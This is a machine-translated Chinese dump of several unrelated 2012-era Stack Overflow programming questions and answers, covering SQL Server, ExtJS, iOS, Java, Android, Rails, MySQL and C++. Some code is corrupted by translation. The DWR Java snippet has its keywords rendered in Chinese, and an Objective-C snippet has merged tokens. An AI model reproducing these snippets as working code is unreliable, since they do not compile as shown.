然后对 Josien 说的脚本进行编辑；滚动到底部`CREATE TABLE`，找到您的主键并附`IDENTITY(1,1)`加到逗号之前的末尾。运行脚本。

由于[这个问题，DROP 和 CREATE 脚本对我也很有帮助。](https://stackoverflow.com/questions/10550488/drop-table-then-cannot-recreate-table-with-the-same-name)（生成的脚本处理。）

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2019-12-16T10:54:42.820

您可以在创建表时使用关键字`IDENTITY`作为列的数据类型以及约束。 前任：`PRIMARY KEY`

```
StudentNumber IDENTITY(1,1) PRIMARY KEY 
```

在这里，第一个“1”表示起始值，第二个“1”是递增值。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2014-01-03T11:00:09.907

如果表已填充，则无法将列更改为 IDENTITY 列或将其转换为非 IDENTITY 列。您需要导出所有数据，然后您可以将列类型更改为 IDENTITY，反之亦然，然后再导入数据。我知道这是一个痛苦的过程，但我相信除了使用本文中提到的序列之外别无选择。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2017-03-11T12:03:08.797

如果您希望 ID 元素是连续的，请小心。因为 SQLSERVER ID 可以跳跃 1000 。

示例：在重新启动之前 ID=11 重新启动后，您在表中插入新行，则 ID 将为 1012。

# java - 正则表达式匹配文件版本模式

> ID：10991895
> 
> 赞同：0
> 
> 时间：2012-06-12T07:05:12.823
> 
> 标签：java, regex

我是 Regex 的新手。我想匹配我的文件的模式 .. 像 1.2.2。与 1.2.3 相同。

因为有时会有像 1.2.4.3 这样的错误。所以我想忽略那个。

正则表达式是否可能仅获取具有模式 = 1.2.2 的文件。表示 xyz

请提出一些好的例子或如果可能的话..

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T07:08:25.567

您可以使用如下正则表达式检查字符串是否具有以下`1.2.3`格式：

```
^\d+\.\d+\.\d+$ 
```

`1.2.3.4`不匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:09:43.197

那这个呢：

```
.+?=([0-9]+\.){2}[0-9]+[^\.]+ 
```

它识别这样的模式：

Mylib=0.0.1(+任何不是点的东西)

由于注释而编辑

# extjs - 在 Rowexpander 插件中循环 Json 数组

> ID：10991896
> 
> 赞同：0
> 
> 时间：2012-06-12T07:05:40.167
> 
> 标签：extjs

我有一个网格，我想用 RowExpander 插件显示额外的信息。当用户单击 时`cross`，json 数组应该在扩展行中可用。我尝试了一切，但没有成功显示扩展的内容。

当我单击叉号时，我可以在控制台中看到运行良好的 json 数组。但是，数组内容在模板中不可用。

你能帮我吗，我做错了什么？

**JSON ARRAY（普通网格数据）**

```
[{"FORM_ID":"1","SUPPLIER_NO":"678456","SUPPLIER_NAME":"PINAR UNLU MAMÜLLER","RECORD_DATE":"12.06.2012","DELIVERY_NO":"215554","GRAND_TOTAL":"573","DRIVER_NAME":"Oğuz Çelikdemir","LICENSE_PLATE":"34 OGZ 6520"},{"FORM_ID":"2","SUPPLIER_NO":"75655463","SUPPLIER_NAME":"PINAR ET VE ET ÜRÜNLERİ","RECORD_DATE":"15.06.2012","DELIVERY_NO":"215556","GRAND_TOTAL":"619","DRIVER_NAME":"Murat Kayın","LICENSE_PLATE":"34 NES 7896"},{"FORM_ID":"3","SUPPLIER_NO":"32645668","SUPPLIER_NAME":"ÜLKER BİSKÜVİ","RECORD_DATE":"19.06.2012","DELIVERY_NO":"4563657","GRAND_TOTAL":"657","DRIVER_NAME":"Metin Yılmaz","LICENSE_PLATE":"06 ANK 6500"}] 
```

**JSON ARRAY（扩展内容）**

```
[{"PRODUCT_NAME":"İÇECEK","QUANTITY":"2.00","SAS":"100","UNIT_ID":"1","UNIT_PRICE":"34.92","TOTAL":"70"},{"PRODUCT_NAME":"ŞARKÜTERİ","QUANTITY":"4.00","SAS":"100","UNIT_ID":"1","UNIT_PRICE":"34.92","TOTAL":"140"},{"PRODUCT_NAME":"KURU GIDA","QUANTITY":"1.00","SAS":"250","UNIT_ID":"1","UNIT_PRICE":"34.92","TOTAL":"35"},{"PRODUCT_NAME":"DETERJAN","QUANTITY":"5.00","SAS":"100","UNIT_ID":"1","UNIT_PRICE":"34.92","TOTAL":"175"},{"PRODUCT_NAME":"MEYVE SEBZE ve ET","QUANTITY":"3.00","SAS":"250","UNIT_ID":"1","UNIT_PRICE":"34.92","TOTAL":"105"}] 
```

**EXTJS**

```
 var formStore = new Ext.data.JsonStore({
    url: 'form-data.php',
    root: 'fdata',
    idProperty: 'FORM_ID',
    remoteSort: true,
    fields: ['FORM_ID', 'SUPPLIER_NO', 'SUPPLIER_NAME', 'RECORD_DATE', 'DELIVERY_NO', 'DRIVER_NAME', 'LICENSE_PLATE',
    { name: 'GRAND_TOTAL', type: 'float'}]
}); 

formStore.setDefaultSort('RECORD_DATE', 'asc');

var checkboxSel = new Ext.grid.CheckboxSelectionModel();

var rowExpander = new Ext.grid.RowExpander({});

rowExpander.on('beforeexpand', function(rowexpander, record, body, rowindex) { 
    Ext.Ajax.request({
        url: 'form-details.php' + '?fid=' + record.get('FORM_ID'),
        method: 'GET',
        success: function ( result, request ) {
            var jsonData = Ext.util.JSON.decode(result.responseText);
            tpl.overwrite(body, jsonData);
        },
        failure: function ( result, request ) {
            Ext.MessageBox.alert('Failed', result.responseText);
            return false;
        }
    });
    return true;
}); 

var tpl = new Ext.Template(
    '<p>URUN ADI : {PRODUCT_NAME}</p><br/>',
    '<p>TOPLAM : {QUANTITY}</p>'
);

Ext.onReady(function() {

    var grid = new Ext.grid.GridPanel({
        title: 'ME.117.10 - Hammaliye Formu',
        store: formStore,
        sm: checkboxSel,
        columns: [
                    checkboxSel, rowExpander,
                    { header: "ID", 
                      width: 40, 
                      dataIndex: 'FORM_ID', 
                      sortable: false 
                    },
                    { header: "Satıcı No",
                      id: 'form-id',
                      dataIndex: 'SUPPLIER_NO',
                      width: 40,
                      sortable: false
                    },
                    { header: "Satıcı Firma", 
                      dataIndex: 'SUPPLIER_NAME', 
                      width: 290, 
                      sortable: true 
                    },
                    { header: "Kayıt Tarihi",
                      width: 80,
                      dataIndex: 'RECORD_DATE',
                      sortable: true
                    },
                    { header: "İrsaliye No",
                      width: 80,
                      dataIndex: 'DELIVERY_NO',
                      sortable: false
                    },
                    { header: "Tutar",
                      width: 80,
                      dataIndex: 'GRAND_TOTAL',
                      sortable: false
                    }
                ],
            autoExpandColumn: 'form-id',
            renderTo: document.getElementById('form-results'),
            width: 750,
            height: 500,
            loadMask: true,
            columnLines: true,
            plugins: rowExpander
    });

    formStore.load();
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T15:31:34.120

我假设您使用的是 ExtJS 3.x，因为这就是您的编码所反映的。如果你在 ExtJS 3.x 中需要帮助，我帮不了你太多，我更习惯于 ExtJS 4.x 的编码方式，所以我将用它来解释这一点。

我正在努力实现一个像这样的嵌套网格，并且刚刚完成了这个过程：

基本上你需要用`rowexpander`你已经完成的插件配置你的主网格（下面是我做的方式）：

```
plugins: [{
     ptype: "rowexpander",
     rowBodyTpl: ['<div id="SessionInstructionGridRow-{ClientSessionId}" ></div>']    
}], 
```

然后在您的控制器中，您只需要设置一个要发生`expandbody`的`rowexpander`事件即可：

```
this.control({
    'gridview' : {
        expandbody : this.onGridExpandBody
    }
}); 
```

最后，您将脚本写入您`<div>`在`rowexpander`插件模板中创建的标签：

```
onGridExpandBody : function(rowNode, record, expandbody) {
    var targetId = 'SessionInstructionGridRow-' + record.get('ClientSessionId');
    if (Ext.getCmp(targetId + "_grid") == null) {
        var sessionInstructionGrid = Ext.create('TS.view.client.SessionInstruction', {
            renderTo: targetId,
            id: targetId + "_grid"
        });
        rowNode.grid = sessionInstructionGrid;
        sessionInstructionGrid.getEl().swallowEvent(['mouseover', 'mousedown', 'click', 'dblclick', 'onRowFocus']);
        sessionInstructionGrid.fireEvent("bind", sessionInstructionGrid, { ClientSessionId: record.get('ClientSessionId') });
    }
} 
```

阅读：[使用 extjs 4 的嵌套网格以](https://stackoverflow.com/questions/8254113/nested-grid-with-extjs-4/8254413#8254413)获取更多信息。

# ios - AVCaptureSession队列实现中的警告

> ID：10991900
> 
> 赞同：0
> 
> 时间：2012-06-12T07:06:01.337
> 
> 标签：ios, xcode, avcapturesession

我在该行中收到警告：

> （将“ViewController *const_strong”发送到不兼容类型“id”的参数

在实现这行代码时

```
[output setSampleBufferDelegate:self queue:queue]; 
```

用于处理队列的代码

```
 [[selfcaptureSession]addOutput:output];
dispatch_queue_t queue =dispatch_queue_create("myQueue", NULL);
    [outputsetSampleBufferDelegate:selfqueue:queue];
dispatch_release(queue); 
```

谁能指出这其中的原因？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:57:00.593

我刚刚找到了警告 The delegate property is typed as id 的解决方案。但自我不是。使用 ARC 时，我们必须显式地进行强制转换，以便类型正式一致。

所以解决方案是添加 (id)self

```
[output setSampleBufferDelegate:(id)self queue:queue]; 
```

干杯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:18:47.450

猜猜应该是：

```
[outputsetSampleBufferDelegate:self queue:queue]; 
```

但我认为问题不存在，否则它将无法正常工作。警告是不言自明的，您将 发送`ViewController`到 type 的参数`id`。你能显示方法的签名吗？

# java - StringBuilder.insert()

> ID：10991904
> 
> 赞同：0
> 
> 时间：2012-06-12T07:06:17.270
> 
> 标签：java, stringbuilder

我需要比较两个字符串。

输入值就像

> 选择 * 从 ds WHERE ds.age='24';

需要与之比较的文本是

> SELECT * FROM ds WHERE ds.status='VALID' AND ds.age='24';

由于 "ds.status='VALID' AND" 是一个静态字符串，所以我想将其插入到输入中，然后将其与原始字符串进行比较。

所以我创建了一个 StringBuilder 对象和

> query.insert(query.indexOf("WHERE"), "ds.status='VALID' AND");

但输出是

> SELECT * FROM ds ds.status='VALID' AND WHERE ds.age='24';

此外， indexOf() 不能输入静态位置，因为它可以随输入而变化。有没有办法找到单词“WHERE”的最后一个字母的索引？

我发现的解决方法是

> 字符串查询 = query.replace("WHERE", "WHERE ds.status='VALID' AND");

这是最好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:09:01.243

```
query.insert(query.indexOf("WHERE") + "WHERE".length(), " ds.status='VALID' AND"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T08:14:48.353

我认为替换更干净，更容易阅读 - 就像彼得劳里的评论：

```
query.replace(" WHERE ", " WHERE ds.status='VALID' AND "); 
```

不必担心栅栏错误或幻数，而且意图更清晰！

*编辑*

那将是：

```
query.toString().replace(" WHERE ", " WHERE ds.status='VALID' AND "); 
```

（在 StringBuilder 上替换需要索引）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:43:09.097

你可以做这样的事情 -

```
 StringBuffer str = new StringBuffer("SELECT * FROM ds WHERE ds.age='24'");
    str.insert(str.lastIndexOf("WHERE") + 6, "ds.status='VALID' AND "); 
```

# c - C和64位指针计算

> ID：10991905
> 
> 赞同：2
> 
> 时间：2012-06-12T07:06:24.590
> 
> 标签：c, winapi, pointers, 64-bit, driver

我正在做一个内核模式驱动程序，在 64 位上运行代码时遇到了一些错误。

该代码在 32 位上运行良好，但是当我在 amd64 中构建/运行时，我得到了奇怪的结果。我阅读了一些关于 64 位指针和寻址与 32 位与 16 位（在 win32 中）的内容，我确信我遗漏了一些关于 64 位架构中指针基础知识的内容。

这是在 32 位中运行良好的 C 代码。 `ncImageLoadEventSettings.buff`是一个`char*`并且`ncILHead->count`只是一个int。

```
// Calculate offset
    pnt = (void*)(ncImageLoadEventSettings.buff + sizeof(struct NC_IL_HEAD) + (ncILHead->count * sizeof(struct NC_IL_INFO))); 
```

此代码计算将结构对象写入缓冲区的地址（从 开始`.buff`），这在 32 位模式下工作得非常好。

需要注意的是，读取这个缓冲区的程序是32位的。我想我在某处读到 64 位模式下的结构与 32 位模式下的结构大小不同。

32 位阅读器程序可以很好地读取缓冲区的一些内容，而大多数条目都是垃圾。

这是计算地址的正确方法，还是读取该缓冲区的 64 位和 32 位读取器应用程序可能存在问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:12:53.583

请参阅[http://en.wikipedia.org/wiki/Data_structure_alignment#Typical_alignment_of_C_structs_on_x86](http://en.wikipedia.org/wiki/Data_structure_alignment#Typical_alignment_of_C_structs_on_x86)

通常，指针更大（64 位），并且大多数 64 位大小的字段（包括指针）将对齐（添加填充）。

# java - PrintWriter 在重定向时设置错误标志

> ID：10991909
> 
> 赞同：2
> 
> 时间：2012-06-12T07:06:56.547
> 
> 标签：java, jetty, embedded-jetty, dwr

我正在开发一个使用 DWR 进行推送机制的 Web 应用程序。我观察到`PrintWriter`课程`HttpServletResponse`设置错误。逻辑：dwr的自定义flush方法：

```
    PrintWriter out = reponse.getWriter();
    公共布尔冲洗（）{
        out.flush();
        如果（out.checkError（））{
            /* 发送响应时出错，所以下次推送时重新发送响应 */
            返回假；
        }
        /* 响应发送成功 */
        返回真；
    }

```

奇怪的是，即使有错误的 PrintWriter 成功地向客户端发送响应，由于在上面的代码中 out.checkError() 将返回 true，响应将被重新发送给客户端。

经过进一步观察，我发现每次出现这种不当行为时都会记录以下语句：WARN:oejh.HttpGenerator:Ignoring extra content

这取决于浏览器类型，这发生在 chrome、firefox 而不是在 IE 中。

1.  这 (HttpGenerator: Ignoring extra content) 是否会更新 PrintWriter 的任何内容？
2.  当 PrintWriter 设置错误标志时？
3.  浏览器如何响应这种响应（HttpGenerator: Ignoring extra content）？

服务器：jetty-7.6.3 DWR：dwr-3.0.0-RC3-dev-425

# c# - 使用 C# ASP.NET 将 Word 文档内容传输到服务器端的 Web 环境

> ID：10991912
> 
> 赞同：3
> 
> 时间：2012-06-12T07:07:09.527
> 
> 标签：c#, asp.net, html, ms-word, tinymce

我们有一些由客户准备的 Ms Word .docx 格式的内容。这些文档可能有方程式、图像等。

我们希望将这些内容传输到我们的网络环境中。

首先，我打算使用 TinyMCE “paste from word”插件和 fmath 编辑器插件。没用...

然后我决定放上载按钮来传输 ms word 内容并将生成的 web 内容显示到 TinyMCE 编辑器中。实际上就像写一个新插件一样。

我正在使用 Microsoft.Office.Interop.Word.Document 类的“SaveAs”方法。但我有以下问题：

1) 我无法更改文档资源文件夹路径。它生成与生成的 html 文件相同的“..._files”文件夹。我想将所有资源转移到服务器上的适当位置。

2）我不能将图像源路径更改为绝对路径。

3）太多垃圾样式，生成的html文件上的代码。

我可能完全以错误的方式来达到这个目的。所以我决定先听听你的建议，然后再继续这个方向。我愿意提出任何建议。

问候，

我正在添加此代码的草稿版本：

```
 var fileName = Request["docfilename"];
    var file = Request.Files[0];
    var buffer = new byte[file.ContentLength];
    file.InputStream.Read(buffer, 0, file.ContentLength);
    var root = HttpContext.Current.Server.MapPath(@"~/saveddata/_temp/");
    var path = Path.Combine(root, fileName);

    using (var fs = new FileStream(path, FileMode.Create))
    {
        using (var br = new BinaryWriter(fs))
        {
            br.Write(buffer);
        }
    }

    Microsoft.Office.Interop.Word.ApplicationClass oWord = new ApplicationClass();
    object missing = System.Reflection.Missing.Value;
    object isVisible = false;
    word.Document oDoc;
    object filename = path;
    object saveFile;
    oDoc = oWord.Documents.Open(ref filename, ref missing, ref missing, ref missing,
     ref missing, ref missing, ref missing, ref missing,
     ref missing,ref missing, ref missing, ref missing, ref missing, ref missing,
                        ref missing, ref missing);
    oDoc.Activate();

    object path2 = Path.Combine(root, "test.html");
    object fileFormat = word.WdSaveFormat.wdFormatFilteredHTML;
    oDoc.SaveAs(ref path2, ref fileFormat, missing, missing, missing, missing, missing, missing,
                missing, missing, missing, missing, missing, missing, missing, missing);

    oDoc.Close(ref missing, ref missing, ref missing);
    oWord.Application.Quit(ref missing, ref missing, ref missing); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T08:38:51.183

这是一个微妙的问题。我面临同样的问题，因为 doc 有很多样式标签。如果您注意到，请尝试在 facebook 上分享一个 url（其中包含 word doc 内容），然后在 url 的描述/摘要中，使用不需要的标签 :) 所以我猜这个问题在那里也一直存在。我建议，通过信息检索的基础知识并尝试智能地剥离样式标签。您将需要使用正则表达式编写大部分剥离代码

# android - 单击主页按钮时如何从第一个启动应用程序

> ID：10991915
> 
> 赞同：0
> 
> 时间：2012-06-12T07:07:21.357
> 
> 标签：android, android-layout

在我的应用程序中，当我单击主页按钮时，当我再次打开应用程序时，它应该来自第一个。我将启动屏幕作为我的第一个活动。当我打开应用程序时，应用程序应该从启动屏幕启动。

```
 @Override
    public void onAttachedToWindow() {
        super.onAttachedToWindow();
        this.getWindow().setType(WindowManager.LayoutParams.TYPE_KEYGUARD);           
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

      if(keyCode == KeyEvent.KEYCODE_HOME)
       {
        Log.i("Home Button","Clicked");

        onPause();
       }

   return false;

      }
    protected void onPause() {
         super.onPause(); 
        Intent i=new Intent(H2.this,HomeexampleActivity.class);
        startActivity(i);
        // Start your first Activity as you would normally do

    } 
```

我通过覆盖暂停方法尝试以这种方式但是它不起作用。请帮助我如何解决这个问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:17:50.707

你可以试试这个：

```
 Boolean hasGone = false;
  @Override
 void onResume() {
  super.onResume();  
  if(hasGone){    
      Intent intent = new Intent(H2.this, HomeexampleActivity.class);
      intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
      startActivity(intent);
  }
 }

 @Override
 void onPause() {
     super.onPause(); 
     hasGone = true;
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T08:21:08.053

尝试在清单文件中的每个活动标签中写下这一行

```
android:launchMode="singleTask" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:11:54.193

`i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);`之前使用`startActivity(i);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T07:42:39.377

您应该在`onResume()`not in 中有该代码`onPause()`。因为，当您单击主页按钮时，`onPause()`会调用。但是当您恢复您的应用程序时，`onResume()`会调用它。因此，如果您想重定向您的应用程序以重新开始，请在所有类中启动您的 first `Activity`in`onResume()`方法。`Activity`

请记住，这`onResume()`也立即被调用一次`onCreate()`，因此保留一个`flag`值来检查您`onResume()`是在之后调用`onCreate()`还是在应用程序恢复时调用它。

# image-processing - 图像水印算法

> ID：10991925
> 
> 赞同：0
> 
> 时间：2012-06-12T07:07:56.267
> 
> 标签：image-processing, fonts, watermark

我想在这个网站上加入一个带有“迪斯尼乐园巴黎门票”这样的文字的图像：

![在此处输入图像描述](../Images/29fd24a1a658594226a509f22d466d0a.png)

（它给出了一个字母“A”）。上面有一张米奇图片和许多平铺名称。

有谁知道如何实现这个？我必须使用什么算法？

# c# - 如何给 Csharp Webbrowser 默认路径以下载文件

> ID：10991926
> 
> 赞同：2
> 
> 时间：2012-06-12T07:07:56.330
> 
> 标签：c#, browser, dialog

我正在用 C Sharp 制作一个网络浏览器，我希望用户在此网络浏览器上从任何网站下载的所有文件，网络浏览器将其保存在一个默认文件夹中（即 C:\Users\Abc\Downloads）

目前，当我尝试从任何 url 下载文件时，它会弹出一个对话框询问路径，这很烦人，所以我只想提供一个默认路径，它只是自动保存文件而不询问用户路径。

就像我们有 Mozila firefox 和 google 的默认下载路径一样，每当用户从 Web 浏览器下载任何文件时，它都会保存在一个默认文件夹中。那么如何在 .net 4.0 Csharp 网络浏览器中实现这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:48:33.843

如果您在 c# 中使用 WebBrowser 控件，这可能会有些挑战，但请查看此链接，这可能会对您有所帮助，我自己尝试过，效果很好。

[http://www.codeproject.com/Articles/31163/Suppressing-Hosted-WebBrowser-Control-Dialogs](http://www.codeproject.com/Articles/31163/Suppressing-Hosted-WebBrowser-Control-Dialogs)

祝你好运！:)

编辑：您可能还想研究此问题的解决方案：

[使用没有 url 的 WebBrowser 自动下载文件](https://stackoverflow.com/questions/1145426/automated-filedownload-using-webbrowser-without-url)

:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:12:21.967

恐怕你不能用网络浏览器控制，也许看看

[http://www.mono-project.com/WebBrowser](http://www.mono-project.com/WebBrowser)

首先你不使用IE，如果我是对的，你可以做更多

问候，

科尔内

# ruby-on-rails - 通过 localhost 向 ROR 应用程序中的注册用户发送确认电子邮件

> ID：10991932
> 
> 赞同：1
> 
> 时间：2012-06-12T07:08:26.283
> 
> 标签：ruby-on-rails, confirmation-email

在我的 ROR 应用程序中，我试图在注册用户注册时向他们发送确认电子邮件，我的网站目前位于本地主机上。我收到此错误：

```
"undefined method `recipients' for #<UserMailer:0x3d841a0>" 
```

这是我的代码；

**发展.rb**

```
config.action_mailer.delivery_method = :smtp
config.action_mailer.default_url_options = { :host => "localhost:3000"}
config.action_mailer.smtp_settings = {
      :address      => "smtp.gmail.com",
      :port          => "587",
      :authentication => :login,
      :user_name      => "myemailid@gmail.com",
      :password       => "myrealpassword"
} 
```

**用户控制器.rb**

```
def new
  UserMailer.registration_confirmation(@user).deliver
end

def create
  @user = User.new(params[:user])
  if @user.save
    UserMailer.registration_confirmation(@user).deliver
    sign_in @user
    flash[:success] = "Welcome!"
    redirect_to @user
  else
    render 'new'
  end
end 
```

**user_mailer.rb**

```
class UserMailer < ActionMailer::Base   
  def registration_confirmation(user)
    recipients   user.email
    from         "myemailid@gmail.com"
    subject      "Thank you for registration"
    body         :user => user  
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:14:42.417

你用的是什么版本的 Rails？

3.2 版更改了电子邮件的发送（我相信）

[http://api.rubyonrails.org/classes/ActionMailer/Base.html](http://api.rubyonrails.org/classes/ActionMailer/Base.html)

尝试：

`UserMailer.registration_confirmation(@user).deliver`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T09:50:07.387

这是你的 user_mailer.rb

```
user_mailer.rb

class UserMailer < ActionMailer::Base
  def registration_confirmation(user)
    recipients   user.email
    from         "myemailid@gmail.com"
    subject      "Thank you for registration"
    body         :user => user  
  end 
```

请尝试：

```
class UserMailer < ActionMailer::Base
  default from: "myemailid@gmail.com"

  def registration_confirmation(user)
    mail(to: user.email, subject: "Thank you for registration")
  end
end 
```

并在views/user_mailer 中设置适当的视图，例如registration_confirmation.html.erb

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T10:03:43.883

****发展.rb****

```
config.action_mailer.delivery_method = :sendmail
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true 
```

**** 用户控制器.rb ****

```
def new
  UserMailer.registration_confirmation(@user).deliver
end
def create
  @user = User.new(params[:user])
  if @user.save
    UserMailer.registration_confirmation(@user).deliver
    sign_in @user
    flash[:success] = "Welcome!"
    redirect_to @user
  else
    render 'new'
  end
end 
```

**** User_mailer.rb ****

```
 def registration_confirmation(user) 
   @message = 'whatever you want to say here!'
   mail(:from => "myemailid@gmail.com", :to => user.email, :subject => "Thank you for registration")
end 
```

****/app/views/user_mailer/registration_confirmation.text.erb ***

```
<%= @message %> 
```

这就是我在开发模式下所做的，并且有效

# mysql - MySQL查询最近的最低值和实际值问题

> ID：10991934
> 
> 赞同：0
> 
> 时间：2012-06-12T07:08:31.887
> 
> 标签：mysql

我有带有文件和值的表“测试”

```
id number
1   13
2   17
3   20
4   30
5   40 
```

如果我提供 14、15、16，那么它应该给我 13。如果我提供 22、24、24，那么它应该给我 20。如果我提供 13，那么它应该给我 13。如果我提供 20，那么它应该给我20.

我正在为此寻找 mysql 查询，它提供最接近的最低值和实际值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:15:17.410

假设您发送一个包含值列表的表格

```
SELECT
   *
FROM
   MyTable
WHERE
   number <= (SELECT MIN(requireNuber) FROM InputTable)
ORDER BY 
   number DESC
LIMIT 1 
```

虽然，我确信您只能从客户端向 MySQL 发送最低值（为什么不能），这会使代码看起来像

```
SELECT
   *
FROM
   MyTable
WHERE
   number <= @MyParameter
ORDER BY 
   number DESC
LIMIT 1 
```

# c++ - 带有模板的简单示例

> ID：10991936
> 
> 赞同：3
> 
> 时间：2012-06-12T07:08:37.310
> 
> 标签：c++, templates

这是一个简单的问题，我确信之前已经回答过，但我似乎找不到一个好的答案。

我有一堂课，点：

```
template<class T>
Point{
\\code
} 
```

...现在我想要一个点向量，其中一些将 T 作为整数，而将 T 作为双精度数。我想写类似的东西

```
template<class T>
std::vector<Point<T> > points; 
```

但是，唉，这不会与错误“'template'之前的预期主表达式”一起编译。我无法对这段代码坐立不安以使其工作。同样相关的是点在主类中，所以我不能将模板声明粘贴在函数之外。

如果有人可以指导我找到解决方案，我将非常感激。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T07:18:13.563

如果您的目标是同时`vector`拥有两者`Point<int>`，`Point<double>`那么您可以使用[Boost Variant](http://www.boost.org/doc/libs/1_49_0/doc/html/variant.html)。

```
typedef boost::variant<Point<int>, Point<double> > VariantPoint; 
```

然后：

```
std::vector<VariantPoint> my_vector;

my_vector.push_back(Point<int>(1, 0));
my_vector.push_back(Point<double>(1.5f, 2.0f)); 
```

将工作。请注意，要在之后检查元素，您可能必须使用[此处](http://www.boost.org/doc/libs/1_49_0/doc/html/variant/reference.html#header.boost.variant.apply_visitor_hpp)记录的[访问者模式](http://en.wikipedia.org/wiki/Visitor_pattern)。

如果您的目标是拥有只能包含一种类型的不同向量类型`Point`，那么您可以使用：

```
template<typename T> using PointVector = std::vector<Point<T>>; // C++11

// Now you can write:
PointVector<int> my_vector;

// Which is equivalent to:
std::vector<Point<int>> my_vector; 
```

或者，如果 C++11 不是一个选项：

```
template<typename T> struct PointVector
{
  typedef std::vector<Point<T> > Type;
} 
```

然后：

```
PointVector<int>::Type my_vector; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T07:36:48.993

要获得一种向量，我会使用继承：

```
template <typename T>
struct PointVector : public std::vector< Point<T> >
{
}; 
```

注意，继承只是实现模板 typedef 等价的一种机制。这意味着，`PointVector`不应包含任何数据成员或虚函数。但是，@ereOn 的建议是首选，并在[此问题](https://stackoverflow.com/questions/26151/template-typedefs-whats-your-work-around)的答案中进行了讨论。

实现变体的老式方法是使用联合。

```
class IntOrDouble {
    union {
        int i;
        double d;
    };
    bool is_int;
    bool is_double;
public:
    IntOrDouble () : is_int(false), is_double(false) {}
    IntOrDouble (int x) : is_int(true), is_double(false) { i = x; }
    IntOrDouble (double x) : is_int(false), is_double(true) { d = x; }
    int operator = (int x) {
        is_int = true;
        is_double = false;
        return i = x;
    };
    double operator = (double x) {
        is_int = false;
        is_double = true;
        return d = x;
    };
    operator int () const {
        if (is_int) return i;
        if (is_double) return d;
        return 0;
    }
    operator double () const {
        if (is_double) return d;
        if (is_int) return i;
        return 0;
    }
};
typedef std::vector< Point<IntOrDouble> > PointVector; 
```

But it all seems a little over the top for this use case. I'd just use vectors of double all around, unless memory was *really* tight.

# android - Display类中getWidth()方法与Android中XML布局的关系

> ID：10991940
> 
> 赞同：0
> 
> 时间：2012-06-12T07:08:47.827
> 
> 标签：android, android-layout, screen-size, xml-layout

根据[屏幕支持的Android文档](http://developer.android.com/guide/practices/screens_support.html)，他们描述如下，

*   *超大屏幕至少为 960dp x 720dp*
*   *大屏幕至少为 640dp x 480dp*
*   *普通屏幕至少为 470dp x 320dp*
*   *小屏幕至少为 426dp x 320dp*

我有一个代码片段如下；

```
Display display = getWindowManager().getDefaultDisplay();
int displayWidth = display.getWidth(); 
```

我需要了解与***displayWidth***输出相关的 XML 布局的值范围。

例如，我想要一个类似的答案；

如果***0 < displayWidth < 320***是***小屏幕***

上面这句话可能错了，我只是看到一个例子。

此外，我们可以在 res 目录下拥有 layout、layout-small、layout-large、layout-xlarge 和 layout-xlarge-land 等目录。那么适用于这些布局的 displayWidth 是多少。

作为一个例子，就像上面一样；

如果***0 < displayWidth < 320***用于***布局小***

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:14:47.607

我认为'最好如下计算屏幕的对角线长度。

```
DisplayMetrics  displayMetrics = getResources().getDisplayMetrics();
    double screen_phys_width  = (double)displayMetrics.widthPixels / displayMetrics.xdpi;
    double screen_phys_height = (double)displayMetrics.heightPixels / displayMetrics.ydpi; 
    screen_diagonal = Math.sqrt(screen_phys_width * screen_phys_width + screen_phys_height * screen_phys_height); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:13:32.993

```
 try {
        WindowManager wm = (WindowManager) this
                .getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();

        if (display.getHeight() == 480 && display.getWidth() == 320) {

                  //Medium Screens
            i = 1;
            return i;
        } else if (display.getHeight() == 320 && display.getWidth() == 240) {
                 //Small Screens
            i = 1;
            return i;
        } else if (display.getHeight() == 800 && display.getWidth() == 480) {
                //Large Screens
            i = 1;
            return i;
        } else if (display.getHeight() == 1280 && display.getWidth() == 800) {

               //X-large Screens
           i = 2;
            return i;
        }

    } catch (Exception e) {
        i = 0;
    }
    return i; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-26T16:53:53.870

如果您的目标是知道将使用 layout-small 或 layout-large 等布局中的哪个布局，则可以使用此技巧。您可以拥有一个可见性消失的视图，并向该视图添加一个标签，指示它是哪种布局。

在运行时，您可以检索此视图并测试其标记。这样您就可以知道使用了哪种布局。

android 文档为您提供了对于这样那样的屏幕尺寸，将使用相应类型的布局的信息。现在你的设计决定是为不同的屏幕尺寸编写不同的布局。

# session - Response.Redirect 中丢失的经典 Asp 会话值

> ID：10991941
> 
